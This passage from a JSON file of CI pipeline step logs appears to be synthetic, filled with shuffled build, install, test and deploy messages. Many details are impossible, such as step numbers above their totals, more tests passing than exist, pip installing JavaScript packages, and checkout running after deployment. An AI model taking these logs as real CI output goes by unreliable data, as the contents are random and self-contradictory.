          "FAILED: test_cache_hit",
          "\u2713 Step 'test' succeeded",
          "Step 14/24: Deploying",
          "Using Node.js 19.7.7",
          "Checking out master branch",
          "pip install: Successfully installed react-3.17",
          "[12:19:25] DEBUG: Loading configuration",
          "Step 18/17: Deploying",
          "[12:19:25] DEBUG: Memory usage: 204MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/23: Deploying",
          "HEAD is now at 1333758",
          "[12:19:25] INFO: Processing request",
          "  PASS: integration/test_api_health.spec.js",
          "Done.",
          "Uploading artifact 'coverage' (23 files)",
          "Layer 8/8: RUN command",
          "Step 11/17: Installing dependencies",
          "Image pulled successfully",
          "Transforming 245 files...",
          "Finished.",
          "[12:19:25] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (441ms)",
          "\u2713 Task completed in 337ms",
          "Done.",
          "pip install: Successfully installed react-4.17",
          "Cache invalidated: dependencies",
          "NODE_ENV=development",
          "Compiling src/utils.go...",
          "Ran 142 tests in 28s",
          "[12:19:25] INFO: Processing request",
          "Connection established",
          "[12:19:25] INFO: Connecting to database",
          "Image pulled successfully",
          "Cache hit for key-2432",
          "Step 4/18: Deploying",
          "Installing lodash@5.15.3",
          "\u2713 Step 'setup' succeeded",
          "Switched to branch 'bugfix/task-253'",
          "[12:19:25] INFO: Starting build process",
          "npm notice: created a lockfile",
          "npm install: added 137 packages",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Pulling image: python:18",
          "[12:19:25] INFO: Cache refreshed",
          "[12:19:25] DEBUG: Memory usage: 1200MB",
          "[12:19:25] DEBUG: Connection pool: 19 active",
          "[12:19:25] ERROR: Connection failed",
          "\u2713 Task completed in 4810ms",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 213 packages",
          "Already up to date.",
          "  PASS: unit/test_db_connect.spec.js",
          "Waiting...",
          "Compiling utils/handler.rs...",
          "Connecting to test.io:443...",
          "Bundling runtime.css",
          "Checking out master branch",
          "Step 4/15: Deploying",
          "[12:19:25] WARN: Deprecated API usage",
          "Step 15/15: Deploying",
          "Ready.",
          "Step 10/16: Running migrations",
          "\u2717 build failed with exit code 75",
          "Layer 10/13: COPY command",
          "Step 14/22: Testing",
          "FAILED: test_auth_login",
          "Using Python 3.12",
          "Installing webpack@1.1.3",
          "Cache miss for key-8895",
          "Creating production build...",
          "Exception: TypeError",
          "Layer 3/11: RUN command",
          "Completed.",
          "Success!",
          "FAILED: test_user_create",
          "Cache hit for key-4147",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Uploading artifact 'coverage' (47 files)",
          "[12:19:25] INFO: Cache refreshed",
          "[12:19:25] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "Artifact uploaded: dist.zip (98MB)",
          "[12:19:25] DEBUG: Query executed in 18ms",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-07T12:21:40.127493",
        "finished_at": "2025-12-07T12:21:50.802474",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "WARNING: react has known vulnerabilities",
          "Checking out main branch",
          "Step 8/15: Building",
          "\u2713 All checks passed",
          "Verifying...",
          "Compiling components/handler.rs...",
          "Cache miss for key-5460",
          "Generating source maps...",
          "Exception: RuntimeError",
          "Layer 4/12: COPY command",
          "Minifying vendor.js",
          "pip install: Successfully installed prettier-2.2",
          "NODE_ENV=test",
          "Time: 6.866s",
          "OK",
          "Tests: 209 passed, 132 total",
          "Layer 8/14: COPY command",
          "Exception: ValueError",
          "Switched to branch 'feature/task-676'",
          "Optimizing 15 modules...",
          "npm install: added 455 packages",
          "Artifact uploaded: dist.zip (82MB)",
          "pip: Downloading axios-1.19.tar.gz",
          "Building Docker image...",
          "Installing eslint@3.5.2",
          "Environment: development",
          "[12:19:25] WARN: Deprecated API usage",
          "Ready.",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.9",
          "[12:19:25] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Layer 9/14: ENV command",
          "WARNING: prettier has known vulnerabilities",
          "Step 4/17: Deploying",
          "npm install: resolved 675 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (336MB)",
          "Waiting...",
          "Cache restored successfully (252MB)",
          "Coverage: 92% statements, 89% branches",
          "Snapshots: 27 passed, 25 total",
          "\u2713 build completed",
          "Environment: staging",
          "Using Python 3.9",
          "Ready.",
          "Snapshots: 22 passed, 9 total",
          "TLS handshake completed",
          "Environment: production",
          "Coverage: 83% statements, 78% branches",
          "Ran 85 tests in 3s",
          "npm notice: created a lockfile",
          "Connecting to cloud.services:443...",
          "Creating production build...",
          "[12:19:25] INFO: Request completed",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:25] DEBUG: Query executed in 80ms",
          "Done.",
          "Cache miss for key-6595",
          "Image pulled successfully",
          "Ready.",
          "Checking out develop branch",
          "[12:19:25] INFO: Starting build process",
          "npm install: added 442 packages",
          "[12:19:25] INFO: Processing request",
          "Pushing to registry...",
          "Connection established",
          "Already up to date.",
          "Waiting...",
          "yarn add: Done in 27.41s",
          "Verifying...",
          "Artifact downloaded: 1MB",
          "Cache restored successfully (21MB)",
          "[12:19:25] INFO: Processing request",
          "  PASS: test_user_create (482ms)",
          "Test Suites: 15 passed, 29 total",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Ran 19 tests in 15s",
          "Tests: 489 passed, 129 total",
          "GET /health - 200 (51ms)",
          "[12:19:25] INFO: Request completed",
          "Processing...",
          "pip install: Successfully installed eslint-4.19",
          "Step 14/18: Installing dependencies",
          "Processing...",
          "Ran 58 tests in 14s",
          "[12:19:25] WARN: Deprecated API usage",
          "Environment: production",
          "Already up to date.",
          "[12:19:25] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "POST /upload - 200 (347ms)",
          "GET /health - 200 (3ms)",
          "Compiling src/utils.go...",
          "Completed.",
          "Transforming 299 files...",
          "[12:19:25] DEBUG: Memory usage: 1091MB",
          "Compiling components/utils.go...",
          "Test Suites: 15 passed, 11 total",
          "[12:19:25] DEBUG: Initializing service",
          "Bundling runtime.css",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 5MB",
          "Verifying...",
          "npm notice: package.json updated",
          "NODE_ENV=production",
          "NODE_ENV=test",
          "[12:19:25] INFO: Starting build process",
          "Compiling components/utils.go...",
          "[12:19:25] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "[12:19:25] INFO: Request completed",
          "Layer 8/12: RUN command",
          "NODE_ENV=test",
          "yarn add: Done in 17.25s",
          "Pushing to registry...",
          "Generating source maps...",
          "GET /health - 200 (76ms)",
          "HEAD is now at 5386b6d",
          "\u2717 build failed with exit code 60",
          "Transforming 550 files...",
          "pip: Downloading lodash-3.8.tar.gz",
          "[12:19:25] DEBUG: Initializing service",
          "Cache saved successfully",
          "Building Docker image...",
          "GET /health - 204 (88ms)",
          "Creating production build...",
          "Compiling lib/index.js...",
          "OK",
          "Using Python 3.9",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-07T12:21:50.802474",
        "finished_at": "2025-12-07T12:22:22.827416",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Processing...",
          "Optimizing 55 modules...",
          "[12:19:25] DEBUG: Query executed in 50ms",
          "Using Node.js 18.5.6",
          "[12:19:25] DEBUG: Query executed in 62ms",
          "POST /data - 200 (356ms)",
          "Using Node.js 19.4.9",
          "Building Docker image...",
          "Already up to date.",
          "Done.",
          "npm notice: package.json updated",
          "Environment: development",
          "Artifact downloaded: 15MB",
          "Artifact uploaded: dist.zip (40MB)",
          "[12:19:25] DEBUG: Query executed in 45ms",
          "Using Python 3.10",
          "Snapshots: 1 passed, 26 total",
          "Step 16/16: Testing",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Time: 111.233s",
          "Uploading artifact 'dist' (22 files)",
          "  PASS: test_user_create (127ms)",
          "Transforming 628 files...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Switched to branch 'feature/task-999'",
          "FAILED: test_auth_login",
          "Compiling components/service.java...",
          "Verifying...",
          "Transforming 611 files...",
          "[12:19:25] INFO: Request completed",
          "Step 15/23: Deploying",
          "Uploading artifact 'dist' (15 files)",
          "Layer 8/8: COPY command",
          "npm install: resolved 236 packages",
          "\u2713 Task completed in 4216ms",
          "Compiling utils/app.ts...",
          "Step 4/17: Linting",
          "OK",
          "Pushing to registry...",
          "pip: Collecting react",
          "Pulling image: node:latest",
          "Cache hit for key-4145",
          "HEAD is now at e31fd0a",
          "Snapshots: 20 passed, 41 total",
          "Pushing to registry...",
          "Connecting to test.io:443...",
          "[12:19:25] INFO: Request completed",
          "Layer 9/15: RUN command",
          "Done.",
          "[12:19:25] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "npm install: added 152 packages",
          "Already up to date.",
          "Pulling image: node:latest",
          "Cache saved successfully",
          "Ran 113 tests in 21s",
          "WARNING: prettier has known vulnerabilities",
          "Step 1/22: Building",
          "Time: 12.13s",
          "  PASS: test_api_health (480ms)",
          "Artifact downloaded: 3MB",
          "[12:19:25] DEBUG: Loading configuration",
          "Coverage: 96% statements, 76% branches",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "pip: Installing build dependencies...",
          "Coverage: 97% statements, 91% branches",
          "Already up to date.",
          "Environment: staging",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling vendor.js",
          "WARNING: eslint has known vulnerabilities",
          "pip install: Successfully installed webpack-2.16",
          "Artifact uploaded: dist.zip (37MB)",
          "Compiling utils/index.js...",
          "Snapshots: 36 passed, 33 total",
          "Cache miss for key-2684",
          "Pulling image: node:latest",
          "Creating production build...",
          "Processing...",
          "[12:19:25] INFO: Request completed",
          "\u2713 Task completed in 1023ms",
          "[12:19:25] ERROR: Connection failed",
          "[12:19:25] ERROR: Connection failed",
          "Generating source maps...",
          "  PASS: test_db_connect (162ms)",
          "Bundling styles.css",
          "Ready.",
          "pip: Installing build dependencies...",
          "Step 7/25: Installing dependencies",
          "\u2717 build failed with exit code 73",
          "Processing...",
          "GET /status - 200 (90ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 02464b6",
          "  PASS: test_auth_login (315ms)",
          "[12:19:25] WARN: Deprecated API usage",
          "[12:19:25] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "[12:19:25] INFO: Cache refreshed",
          "Connecting to test.io:443...",
          "Optimizing 43 modules...",
          "[12:19:25] DEBUG: Loading configuration",
          "yarn add: Done in 15.84s",
          "Artifact downloaded: 9MB",
          "Finished.",
          "Connecting to startup.dev:443...",
          "NODE_ENV=development",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:25] WARN: Deprecated API usage",
          "Snapshots: 28 passed, 49 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Building Docker image...",
          "Done.",
          "pip: Collecting react",
          "Platform: linux-x64",
          "TLS handshake completed",
          "Optimizing 59 modules...",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "GET /health - 204 (34ms)",
          "Finished.",
          "Coverage: 93% statements, 70% branches",
          "Generating source maps...",
          "Waiting...",
          "Step 17/22: Installing dependencies",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-07T12:22:22.827416",
        "finished_at": "2025-12-07T12:22:33.502397",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Coverage: 77% statements, 75% branches",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "Bundling styles.css",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "Transforming 990 files...",
          "Image pulled successfully",
          "[12:19:25] DEBUG: Memory usage: 1761MB",
          "Platform: win32-x64",
          "Cache invalidated: build",
          "Layer 2/10: ENV command",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "Uploading artifact 'dist' (43 files)",
          "Compiling src/index.js...",
          "Compiling utils/main.py...",
          "[12:19:25] DEBUG: Initializing service",
          "Cache restored successfully (97MB)",
          "Building Docker image...",
          "Loading...",
          "Fetching submodules...",
          "\u2713 Step 'install' succeeded",
          "GET /api - 201 (46ms)",
          "GET /api - 204 (98ms)",
          "Compiling components/index.js...",
          "Coverage: 88% statements, 75% branches",
          "[12:19:25] DEBUG: Loading configuration",
          "Ran 158 tests in 19s",
          "pip: Collecting webpack",
          "Artifact uploaded: dist.zip (33MB)",
          "npm notice: package.json updated",
          "[12:19:25] ERROR: Connection failed",
          "Loading...",
          "Test Suites: 30 passed, 28 total",
          "[12:19:25] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (24 files)",
          "npm notice: package.json updated",
          "Ready.",
          "Compiling lib/app.ts...",
          "Platform: linux-x64",
          "Test Suites: 31 passed, 38 total",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:25] DEBUG: Initializing service",
          "Ready.",
          "[12:19:25] DEBUG: Memory usage: 197MB",
          "Finished.",
          "Done.",
          "Compiling utils/app.ts...",
          "npm install: added 300 packages",
          "Generating source maps...",
          "pip install: Successfully installed jest-4.1",
          "Cache miss for key-2402",
          "Checking out main branch",
          "Completed.",
          "Snapshots: 13 passed, 46 total",
          "WARNING: eslint has known vulnerabilities",
          "Pushing to registry...",
          "Using Python 3.11",
          "\u2713 All checks passed",
          "Layer 8/10: RUN command",
          "Connection established",
          "pip install: Successfully installed prettier-4.20",
          "Tests: 65 passed, 339 total",
          "yarn add: Done in 13.39s",
          "[12:19:25] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "Platform: darwin-arm64",
          "Compiling utils/service.java...",
          "Pushing to registry...",
          "  PASS: unit/test_api_health.spec.js",
          "Artifact downloaded: 44MB",
          "Step 5/18: Building",
          "Checking out main branch",
          "[12:19:25] INFO: Starting build process",
          "Using Python 3.11",
          "Connection established",
          "Verifying...",
          "Compiling src/app.ts...",
          "Step 2/22: Linting",
          "yarn add: Done in 5.65s",
          "Using Python 3.9",
          "[12:19:25] DEBUG: Loading configuration",
          "[12:19:25] DEBUG: Initializing service",
          "Exception: RuntimeError",
          "Completed.",
          "Test Suites: 10 passed, 26 total",
          "Transforming 161 files...",
          "HEAD is now at 6c04ef1",
          "Step 19/25: Building",
          "TLS handshake completed",
          "Compiling utils/utils.go...",
          "Completed.",
          "[12:19:25] INFO: Cache refreshed",
          "[12:19:25] INFO: Starting build process",
          "[12:19:25] DEBUG: Initializing service",
          "Connecting to test.io:443...",
          "Step 19/17: Running migrations",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "GET /status - 204 (44ms)",
          "Cache miss for key-4378",
          "Verifying...",
          "[12:19:25] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 3227ms",
          "GET /status - 204 (62ms)",
          "pip: Downloading eslint-5.18.tar.gz",
          "pip: Downloading express-4.4.tar.gz",
          "FAILED: test_cache_hit",
          "Step 11/21: Testing",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:25] WARN: Deprecated API usage",
          "Success!",
          "[12:19:25] DEBUG: Initializing service",
          "Using Python 3.12",
          "Artifact downloaded: 7MB",
          "Ran 63 tests in 23s",
          "Waiting...",
          "Completed.",
          "Cache invalidated: build",
          "Cache invalidated: node_modules",
          "Creating production build...",
          "Using Node.js 19.7.8",
          "[12:19:25] DEBUG: Connection pool: 5 active",
          "NODE_ENV=production",
          "[12:19:25] DEBUG: Initializing service",
          "Loading...",
          "NODE_ENV=development",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-07T12:22:33.502397",
        "finished_at": "2025-12-07T12:22:39.907385",
        "log_lines": [
          "=== Step: save_cache ===",
          "Cache restored successfully (273MB)",
          "Test Suites: 12 passed, 10 total",
          "Artifact downloaded: 45MB",
          "  PASS: unit/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (55MB)",
          "[12:19:25] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (6MB)",
          "yarn add: Done in 7.46s",
          "[12:19:25] DEBUG: Initializing service",
          "  PASS: unit/test_api_health.spec.js",
          "pip install: Successfully installed prettier-4.6",
          "Environment: development",
          "Step 3/18: Building",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "Artifact uploaded: dist.zip (60MB)",
          "Step 10/25: Building",
          "[12:19:25] DEBUG: Connection pool: 10 active",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 17.15.2",
          "[12:19:25] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 2/23: Building",
          "Tests: 309 passed, 162 total",
          "Compiling components/handler.rs...",
          "[12:19:25] DEBUG: Initializing service",
          "Optimizing 89 modules...",
          "Tests: 420 passed, 481 total",
          "NODE_ENV=development",
          "HEAD is now at 292fcb7",
          "Platform: linux-x64",
          "Switched to branch 'feature/task-285'",
          "Using Python 3.11",
          "Platform: linux-x64",
          "Pushing to registry...",
          "Waiting...",
          "[12:19:25] DEBUG: Initializing service",
          "Step 3/16: Building",
          "Loading...",
          "Test Suites: 29 passed, 23 total",
          "Loading...",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (48MB)",
          "Compiling lib/main.py...",
          "Uploading artifact 'coverage' (22 files)",
          "Layer 10/14: COPY command",
          "Ran 69 tests in 30s",
          "[12:19:25] DEBUG: Initializing service",
          "  PASS: integration/test_auth_login.spec.js",
          "yarn add: Done in 14.54s",
          "HEAD is now at 393116f",
          "Connecting to cloud.services:443...",
          "Finished.",
          "npm install: added 444 packages",
          "GET /status - 204 (85ms)",
          "npm notice: created a lockfile",
          "Snapshots: 26 passed, 24 total",
          "NODE_ENV=production",
          "Step 4/20: Building",
          "Waiting...",
          "WARNING: eslint has known vulnerabilities",
          "OK",
          "Creating production build...",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (100MB)",
          "Step 9/15: Running migrations",
          "WARNING: webpack has known vulnerabilities",
          "Image pulled successfully",
          "Step 3/16: Running migrations",
          "Cache miss for key-5008",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: TypeError",
          "Platform: linux-x64",
          "Step 15/16: Installing dependencies",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "npm install: resolved 636 packages",
          "npm install: added 22 packages",
          "Artifact uploaded: build.tar.gz (4MB)",
          "pip install: Successfully installed lodash-4.9",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Step 5/17: Testing",
          "FAILED: test_cache_hit",
          "[12:19:25] ERROR: Connection failed",
          "npm install: added 192 packages",
          "Cache saved successfully",
          "Snapshots: 35 passed, 47 total",
          "pip: Downloading lodash-1.13.tar.gz",
          "Uploading artifact 'coverage' (35 files)",
          "Compiling utils/utils.go...",
          "Step 6/18: Linting",
          "Pulling image: node:18",
          "[12:19:25] WARN: Deprecated API usage",
          "[12:19:25] DEBUG: Loading configuration",
          "[12:19:25] WARN: Deprecated API usage",
          "[12:19:25] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "[12:19:25] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (48MB)",
          "Installing axios@3.7.10",
          "npm notice: package.json updated",
          "\u2713 Task completed in 1171ms",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "[12:19:25] INFO: Processing request",
          "Connecting to startup.dev:443...",
          "Step 7/17: Testing",
          "Uploading artifact 'dist' (35 files)",
          "Using Python 3.10",
          "[12:19:25] INFO: Connecting to database",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:19:25] INFO: Connecting to database",
          "[12:19:25] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "npm install: resolved 933 packages",
          "Step 7/21: Linting",
          "Generating source maps...",
          "Completed.",
          "Coverage: 90% statements, 74% branches",
          "yarn add: Done in 12.80s",
          "Connecting to cloud.services:443...",
          "TLS handshake completed",
          "Compiling lib/utils.go...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Verifying...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-07T12:22:39.907385",
        "finished_at": "2025-12-07T12:22:50.582366",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "yarn add: Done in 22.27s",
          "Verifying...",
          "POST /api - 201 (214ms)",
          "Artifact uploaded: dist.zip (84MB)",
          "Installing express@4.5.6",
          "npm install: added 177 packages",
          "Compiling src/index.js...",
          "Connection established",
          "[12:19:25] DEBUG: Memory usage: 1874MB",
          "Building Docker image...",
          "TLS handshake completed",
          "Layer 1/10: COPY command",
          "  PASS: e2e/test_db_connect.spec.js",
          "Cache saved successfully",
          "\u2713 validate completed",
          "Step 3/16: Running migrations",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "pip: Downloading express-4.0.tar.gz",
          "Tests: 354 passed, 413 total",
          "FAILED: test_cache_hit",
          "Step 12/19: Running migrations",
          "Pulling image: alpine:18",
          "pip: Installing build dependencies...",
          "Connecting to example.com:443...",
          "Step 11/24: Deploying",
          "Switched to branch 'hotfix/task-623'",
          "Compiling utils/app.ts...",
          "Loading...",
          "npm notice: package.json updated",
          "Time: 22.123s",
          "[12:19:25] INFO: Cache refreshed",
          "pip: Downloading eslint-1.14.tar.gz",
          "Processing...",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-838'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 16 passed, 42 total",
          "\u2717 build failed with exit code 98",
          "Compiling lib/handler.rs...",
          "Artifact downloaded: 47MB",
          "HEAD is now at fe45388",
          "[12:19:25] DEBUG: Query executed in 32ms",
          "Step 11/21: Building",
          "POST /upload - 202 (43ms)",
          "Step 11/24: Running migrations",
          "[12:19:25] DEBUG: Initializing service",
          "Step 5/20: Building",
          "Waiting...",
          "\u2713 package completed",
          "Waiting...",
          "Cache invalidated: build",
          "Using Node.js 18.20.3",
          "Artifact uploaded: dist.zip (31MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 6/25: Building",
          "POST /upload - 201 (399ms)",
          "Pushing to registry...",
          "\u2713 Task completed in 1421ms",
          "Step 20/16: Building",
          "Platform: darwin-arm64",
          "Switched to branch 'feature/task-156'",
          "Layer 1/13: ENV command",
          "  PASS: test_api_health (452ms)",
          "[12:19:25] INFO: Starting build process",
          "OK",
          "Platform: linux-x64",
          "Optimizing 79 modules...",
          "Layer 6/13: COPY command",
          "POST /api - 202 (441ms)",
          "Completed.",
          "POST /upload - 201 (436ms)",
          "Step 18/24: Deploying",
          "Cache miss for key-6860",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "Environment: staging",
          "npm notice: package.json updated",
          "Uploading artifact 'build' (46 files)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:19:25] ERROR: Connection failed",
          "[12:19:25] DEBUG: Memory usage: 283MB",
          "WARNING: lodash has known vulnerabilities",
          "HEAD is now at 5c775de",
          "Layer 7/13: COPY command",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-110'",
          "Ready.",
          "Bundling styles.js",
          "Layer 5/13: RUN command",
          "TLS handshake completed",
          "Creating production build...",
          "yarn add: Done in 15.15s",
          "Generating source maps...",
          "Success!",
          "[12:19:25] INFO: Request completed",
          "[12:19:25] DEBUG: Memory usage: 1039MB",
          "Fetching submodules...",
          "Cache hit for key-6919",
          "[12:19:25] DEBUG: Query executed in 64ms",
          "[12:19:25] DEBUG: Loading configuration",
          "Transforming 607 files...",
          "  PASS: test_cache_hit (45ms)",
          "[12:19:25] DEBUG: Initializing service",
          "Step 14/23: Linting",
          "Step 2/15: Building",
          "Cache miss for key-4095",
          "[12:19:25] ERROR: Connection failed",
          "Compiling components/service.java...",
          "\u2713 Task completed in 4457ms",
          "\u2713 Step 'install' succeeded",
          "Cache miss for key-5423",
          "TLS handshake completed",
          "Processing...",
          "pip install: Successfully installed axios-2.1",
          "Time: 35.452s",
          "\u2713 All checks passed",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 42 passed, 28 total",
          "pip: Installing build dependencies...",
          "HEAD is now at 3a81e24",
          "Step 16/24: Deploying",
          "WARNING: express has known vulnerabilities",
          "npm install: added 298 packages",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "[12:19:25] ERROR: Connection failed",
          "Finished.",
          "Already up to date.",
          "Verifying...",
          "Step 14/22: Installing dependencies",
          "Loading...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-07T12:22:50.582366",
        "finished_at": "2025-12-07T12:22:54.852358",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:19:25] WARN: Deprecated API usage",
          "[12:19:25] INFO: Request completed",
          "Compiling src/app.ts...",
          "Tests: 462 passed, 344 total",
          "[12:19:25] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (19MB)",
          "[12:19:25] WARN: Deprecated API usage",
          "GET /health - 201 (78ms)",
          "Minifying vendor.js",
          "\u2713 Task completed in 4219ms",
          "Artifact downloaded: 3MB",
          "Using Python 3.9",
          "Platform: win32-x64",
          "Compiling lib/app.ts...",
          "npm notice: package.json updated",
          "Ready.",
          "Using Node.js 18.10.0",
          "[12:19:25] DEBUG: Query executed in 70ms",
          "Coverage: 75% statements, 66% branches",
          "Step 9/21: Linting",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: test_db_connect (71ms)",
          "pip install: Successfully installed webpack-1.0",
          "Snapshots: 38 passed, 2 total",
          "[12:19:25] DEBUG: Initializing service",
          "Waiting...",
          "Compiling utils/index.js...",
          "Cache restored successfully (370MB)",
          "\u2717 build failed with exit code 96",
          "yarn add: Done in 4.10s",
          "[12:19:25] DEBUG: Connection pool: 16 active",
          "Generating source maps...",
          "Using Python 3.12",
          "Ready.",
          "WARNING: eslint has known vulnerabilities",
          "Pushing to registry...",
          "[12:19:25] DEBUG: Initializing service",
          "Using Node.js 19.15.5",
          "Generating source maps...",
          "[12:19:25] INFO: Connecting to database",
          "Ready.",
          "[12:19:25] INFO: Request completed",
          "Switched to branch 'hotfix/task-816'",
          "Finished.",
          "Installing jest@4.13.9",
          "Using Python 3.12",
          "Done.",
          "Bundling main.css",
          "Done.",
          "FAILED: test_user_create",
          "TLS handshake completed",
          "Finished.",
          "Verifying...",
          "Minifying vendor.js",
          "npm install: added 48 packages",
          "Completed.",
          "npm install: added 84 packages",
          "Step 13/20: Testing",
          "Processing...",
          "Time: 71.509s",
          "\u2713 Task completed in 3858ms",
          "Waiting...",
          "[12:19:25] DEBUG: Initializing service",
          "Using Node.js 16.13.8",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "Connecting to test.io:443...",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Processing...",
          "Installing jest@3.5.2",
          "[12:19:25] INFO: Cache refreshed",
          "[12:19:25] WARN: Deprecated API usage",
          "Ready.",
          "[12:19:25] INFO: Request completed",
          "Building Docker image...",
          "Layer 9/12: RUN command",
          "WARNING: axios has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "FAILED: test_user_create",
          "Cache invalidated: dependencies",
          "Snapshots: 24 passed, 19 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 20/17: Testing",
          "\u2713 Task completed in 3946ms",
          "Cache miss for key-6822",
          "Cache saved successfully",
          "Already up to date.",
          "Using Node.js 14.13.4",
          "[12:19:25] DEBUG: Memory usage: 1801MB",
          "Pulling image: alpine:3.11",
          "[12:19:25] DEBUG: Connection pool: 10 active",
          "Step 19/24: Deploying",
          "Minifying vendor.js",
          "pip: Collecting lodash",
          "Pulling image: python:3.11",
          "Ready.",
          "Switched to branch 'hotfix/task-141'",
          "Cache restored successfully (499MB)",
          "\u2717 build failed with exit code 124",
          "Cache hit for key-5348",
          "Test Suites: 44 passed, 18 total",
          "npm install: added 470 packages",
          "Pushing to registry...",
          "Using Node.js 15.12.5",
          "pip install: Successfully installed lodash-4.12",
          "Processing...",
          "Fetching submodules...",
          "OK",
          "pip: Collecting lodash",
          "Already up to date.",
          "Completed.",
          "[12:19:25] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Bundling vendor.css",
          "Using Node.js 17.15.4",
          "[12:19:25] DEBUG: Memory usage: 1837MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:25] DEBUG: Memory usage: 404MB",
          "Snapshots: 5 passed, 26 total",
          "Coverage: 98% statements, 61% branches",
          "Step 11/24: Building",
          "\u2713 Step 'install' succeeded",
          "Completed.",
          "Building Docker image...",
          "Cache hit for key-4893",
          "HEAD is now at d626074",
          "Pulling image: node:18",
          "NODE_ENV=test",
          "Artifact uploaded: dist.zip (9MB)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-07T12:22:54.852358",
        "finished_at": "2025-12-07T12:22:59.122350",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Generating source maps...",
          "Step 13/24: Testing",
          "pip: Collecting express",
          "Compiling lib/handler.rs...",
